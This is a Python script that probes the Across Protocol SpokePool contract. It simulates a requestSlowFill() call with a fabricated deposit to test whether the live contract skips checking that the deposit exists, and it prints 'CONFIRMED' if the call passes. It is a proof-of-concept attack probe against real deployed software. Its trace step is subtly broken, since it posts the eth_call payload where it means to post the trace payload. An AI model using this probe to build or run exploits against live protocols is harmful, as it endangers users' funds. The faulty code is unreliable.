#!/usr/bin/env python3
"""
Deeper simulation of requestSlowFill() on Across Protocol SpokePool.
- Check actual implementation address at the proxy
- Verify function selector matches
- Try calling with debug tracing
- Try calling the implementation directly
"""

import json
import requests
import time
from web3 import Web3

RPC_URL = "http://15.235.183.30:8545"
SPOKEPOOL_PROXY = "0x5c7BCd6E7De5423a257D81B442095A1a6ced35C5"
KNOWN_IMPL = "0x5e5b726c81f43b953a62ad87e2835c85c4d9dd3b"
CALLER = "0x000000000000000000000000000000000000dEaD"

w3 = Web3(Web3.HTTPProvider(RPC_URL, request_kwargs={"timeout": 30}))
latest = w3.eth.get_block("latest")
block_number = latest["number"]
block_timestamp = latest["timestamp"]

print(f"Block: {block_number}, Timestamp: {block_timestamp}")
print()

# ---- Step 1: Read the ERC1967 implementation slot ----
# ERC1967: bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1)
IMPL_SLOT = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"

impl_raw = w3.eth.get_storage_at(Web3.to_checksum_address(SPOKEPOOL_PROXY), int(IMPL_SLOT, 16))
impl_addr = "0x" + impl_raw.hex()[-40:]
print(f"ERC1967 implementation slot value: {impl_raw.hex()}")
print(f"Current implementation address: {impl_addr}")
print(f"Expected implementation:        {KNOWN_IMPL.lower()}")
print(f"Match: {impl_addr.lower() == KNOWN_IMPL.lower()}")
print()

# ---- Step 2: Verify the function selector exists on the implementation ----
# requestSlowFill((address,address,address,address,address,uint256,uint256,uint256,uint32,uint32,uint32,bytes))
# Let's compute the selector
func_sig = "requestSlowFill((address,address,address,address,address,uint256,uint256,uint256,uint32,uint32,uint32,bytes))"
selector = Web3.keccak(text=func_sig)[:4].hex()
print(f"Function signature: {func_sig}")
print(f"Computed selector: 0x{selector}")

# Check contract bytecode for this selector
code = w3.eth.get_code(Web3.to_checksum_address(impl_addr))
code_hex = code.hex()
# Remove the 0x prefix from selector for searching
selector_no_prefix = selector
if selector_no_prefix in code_hex:
    print(f"Selector 0x{selector_no_prefix} FOUND in implementation bytecode")
else:
    print(f"Selector 0x{selector_no_prefix} NOT found in implementation bytecode!")
    # Try alternate function signature forms
    alt_sigs = [
        "requestSlowFill((address,address,address,address,address,uint256,uint256,uint256,uint32,uint32,uint32,bytes))",
    ]
    for sig in alt_sigs:
        sel = Web3.keccak(text=sig)[:4].hex()
        if sel in code_hex:
            print(f"  -> Found alternate: {sig} => 0x{sel}")
print()

# ---- Step 3: Check if pausedFills is true ----
# pausedFills is a public bool. Let's call it.
paused_abi = [{"inputs": [], "name": "pausedFills", "outputs": [{"type": "bool"}], "stateMutability": "view", "type": "function"}]
c = w3.eth.contract(address=Web3.to_checksum_address(SPOKEPOOL_PROXY), abi=paused_abi)
try:
    paused = c.functions.pausedFills().call()
    print(f"pausedFills: {paused}")
except Exception as e:
    print(f"Could not read pausedFills: {e}")
print()

# ---- Step 4: Check getCurrentTime ----
time_abi = [{"inputs": [], "name": "getCurrentTime", "outputs": [{"type": "uint256"}], "stateMutability": "view", "type": "function"}]
c2 = w3.eth.contract(address=Web3.to_checksum_address(SPOKEPOOL_PROXY), abi=time_abi)
try:
    contract_time = c2.functions.getCurrentTime().call()
    print(f"getCurrentTime(): {contract_time}")
    print(f"block.timestamp:  {block_timestamp}")
except Exception as e:
    print(f"Could not read getCurrentTime: {e}")
print()

# ---- Step 5: Try calling with a properly constructed relay data ----
# Let me use a more careful ABI encoding
fill_deadline = block_timestamp + 7200  # 2 hours future

relay_data_tuple = (
    "0x0000000000000000000000000000000000000001",  # depositor
    "0x0000000000000000000000000000000000000002",  # recipient
    "0x0000000000000000000000000000000000000000",  # exclusiveRelayer
    "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1",  # inputToken
    "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",  # outputToken
    1_000_000_000_000_000_000,  # inputAmount
    990_000_000_000_000_000,    # outputAmount
    42161,                       # originChainId
    999_999_999,                 # depositId
    fill_deadline,               # fillDeadline
    0,                           # exclusivityDeadline
    b"",                         # message
)

# Manually encode the calldata using eth_abi
from eth_abi import encode

# The function selector + encoded struct
struct_types = [
    "(address,address,address,address,address,uint256,uint256,uint256,uint32,uint32,uint32,bytes)"
]
struct_values = [
    (
        bytes.fromhex("0000000000000000000000000000000000000001"),
        bytes.fromhex("0000000000000000000000000000000000000002"),
        bytes.fromhex("0000000000000000000000000000000000000000"),
        bytes.fromhex(Web3.to_checksum_address("0x82aF49447D8a07e3bd95BD0d56f35241523fBab1")[2:]),
        bytes.fromhex(Web3.to_checksum_address("0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2")[2:]),
        1_000_000_000_000_000_000,
        990_000_000_000_000_000,
        42161,
        999_999_999,
        fill_deadline,
        0,
        b"",
    )
]

encoded_params = encode(struct_types, struct_values)
calldata = bytes.fromhex(selector) + encoded_params
calldata_hex = "0x" + calldata.hex()

print(f"Manual calldata length: {len(calldata)} bytes")
print(f"Selector: 0x{selector}")
print(f"fillDeadline: {fill_deadline} (block_timestamp + 7200)")
print()

# ---- Step 6: Call via raw JSON-RPC with the manual calldata ----
print("=" * 60)
print("SIMULATION: eth_call with manually encoded calldata")
print("=" * 60)

payload = {
    "jsonrpc": "2.0",
    "method": "eth_call",
    "params": [
        {
            "from": CALLER,
            "to": SPOKEPOOL_PROXY,
            "data": calldata_hex,
            "gas": hex(1_000_000),
        },
        "latest",
    ],
    "id": 1,
}

resp = requests.post(RPC_URL, json=payload, timeout=30)
result = resp.json()

if "error" in result:
    error = result["error"]
    print(f"REVERTED")
    print(f"  Code: {error.get('code')}")
    print(f"  Message: {error.get('message')}")
    error_data = error.get("data", "")
    print(f"  Data: {error_data}")

    if error_data and isinstance(error_data, str) and len(error_data) > 2:
        sel = error_data[:10] if len(error_data) >= 10 else error_data
        print(f"  Error selector: {sel}")

        # Known Across custom errors
        known = {
            "0x08c379a0": "Error(string)",
            "0x4e487b71": "Panic(uint256)",
        }

        # Compute selectors for known Across errors
        across_errors = [
            "FillsArePaused()",
            "NoSlowFillsInExclusivityWindow()",
            "ExpiredFillDeadline()",
            "InvalidSlowFillRequest()",
            "NotExclusiveRelayer()",
            "MsgValueDoesNotMatchInputAmount()",
        ]
        for err in across_errors:
            err_sel = "0x" + Web3.keccak(text=err)[:4].hex()
            known[err_sel] = err
            if err_sel == sel:
                print(f"  DECODED: {err}")

        if sel in known:
            print(f"  Matched: {known[sel]}")
        else:
            print(f"  Unknown custom error selector: {sel}")
            # Print all known selectors for reference
            print("  Known selectors:")
            for k, v in known.items():
                print(f"    {k} -> {v}")
else:
    result_data = result.get("result", "0x")
    print(f"SUCCESS! Result: {result_data}")
    print()
    print("CONFIRMED: requestSlowFill() ACCEPTED the fabricated deposit!")
    print("The call completed without revert, meaning:")
    print("  1. pausedFills = false (checked)")
    print("  2. nonReentrant passed (not in re-entrant context)")
    print("  3. exclusivityDeadline=0 means _fillIsExclusive returns false")
    print("  4. fillDeadline is in the future -> not expired")
    print("  5. fillStatuses[relayHash] == Unfilled (fabricated hash never used)")
    print("  6. NO deposit existence verification occurred")
    print("  7. fillStatuses[relayHash] would be set to RequestedSlowFill")
    print("  8. RequestedSlowFill event would be emitted")

print()

# ---- Step 7: Also try debug_traceCall if available ----
print("=" * 60)
print("TRACE: Attempting debug_traceCall for detailed execution")
print("=" * 60)

trace_payload = {
    "jsonrpc": "2.0",
    "method": "debug_traceCall",
    "params": [
        {
            "from": CALLER,
            "to": SPOKEPOOL_PROXY,
            "data": calldata_hex,
            "gas": hex(1_000_000),
        },
        "latest",
        {"tracer": "callTracer", "tracerConfig": {"withLog": True}},
    ],
    "id": 2,
}

resp2 = requests.post(RPC_URL, json=payload, timeout=60)
trace_result = resp2.json()

if "error" in trace_result:
    print(f"debug_traceCall not available or failed: {trace_result['error'].get('message', '')}")
else:
    trace = trace_result.get("result", {})
    if isinstance(trace, dict):
        print(f"  Type: {trace.get('type')}")
        print(f"  From: {trace.get('from')}")
        print(f"  To: {trace.get('to')}")
        print(f"  Gas used: {trace.get('gasUsed')}")
        print(f"  Output: {trace.get('output', '')[:100]}")
        if trace.get("error"):
            print(f"  Error: {trace.get('error')}")
        if trace.get("revertReason"):
            print(f"  Revert reason: {trace.get('revertReason')}")

        # Check subcalls
        calls = trace.get("calls", [])
        print(f"  Subcalls: {len(calls)}")
        for i, call in enumerate(calls):
            print(f"    [{i}] {call.get('type')} to {call.get('to')} output={call.get('output', '')[:60]} err={call.get('error', '')}")
            if call.get("logs"):
                for log in call["logs"]:
                    print(f"      LOG topics: {log.get('topics', [])[:2]}")
    else:
        print(f"Unexpected result type: {type(trace)}")
